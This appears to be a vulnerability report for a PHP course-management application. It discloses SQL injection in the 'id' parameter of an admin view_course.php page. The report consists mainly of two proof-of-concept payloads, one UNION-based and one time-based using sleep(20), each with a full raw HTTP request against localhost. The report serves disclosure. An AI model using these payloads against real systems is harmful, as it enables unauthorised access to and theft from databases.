BUG_Author:Evan

Vulnerability File: /aqpg/admin/courses/view_course.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1' union all select null,null,concat(0x75767778,0x45464748),null,null,null,null,null-- -

```
GET /aqpg/admin/courses/view_course.php?id=1%27%20union%20all%20select%20null,null,concat(0x75767778,0x45464748),null,null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=gsu6a2n13begpb230tc3rr4m5v
Connection: close
```

union query success

![image](https://github.com/SecurityYH/bug_report/blob/main/sql1.png)

Payload2:id=1' and (select 6 from (select(sleep(20)))d)-- e

```
GET /aqpg/admin/courses/view_course.php?id=1%27%20and%20(select%206%20from%20(select(sleep(20)))d)--%20e HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=gsu6a2n13begpb230tc3rr4m5v
Connection: close
```

Server response time is 20 seconds

![image](https://github.com/SecurityYH/bug_report/blob/main/sql2.png)
